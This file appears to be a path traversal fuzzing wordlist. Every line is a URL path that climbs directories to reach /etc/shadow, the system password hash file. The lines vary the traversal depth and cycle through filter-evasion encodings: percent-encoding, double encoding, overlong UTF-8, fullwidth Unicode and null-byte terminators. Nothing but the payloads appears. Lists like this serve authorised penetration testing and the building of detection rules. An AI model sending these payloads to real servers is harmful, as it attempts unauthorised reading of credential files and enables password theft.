/..%2fetc/shadow%00
/..%2f..%2fetc/shadow%00
/..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00
/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow%00 
/%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00
/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/shadow%00 
/%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow%00
/..%c0%afetc/shadow%00
/..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/shadow%00
/%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2fetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%af%e0%40%ae%e0%40%ae%e0%80%afetc/shadow%00
/%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215etc/shadow%00
/../etc/shadow%2500
/../../etc/shadow%2500
/../../../etc/shadow%2500
/../../../../etc/shadow%2500
/../../../../../etc/shadow%2500
/../../../../../../etc/shadow%2500
/../../../../../../../etc/shadow%2500
/../../../../../../../../etc/shadow%2500
/../../../../../../../../../etc/shadow%2500
/../../../../../../../../../../etc/shadow%2500
/../../../../../../../../../../../etc/shadow%2500
/../../../../../../../../../../../../etc/shadow%2500
/../../../../../../../../../../../../../etc/shadow%2500
/../../../../../../../../../../../../../../etc/shadow%2500 
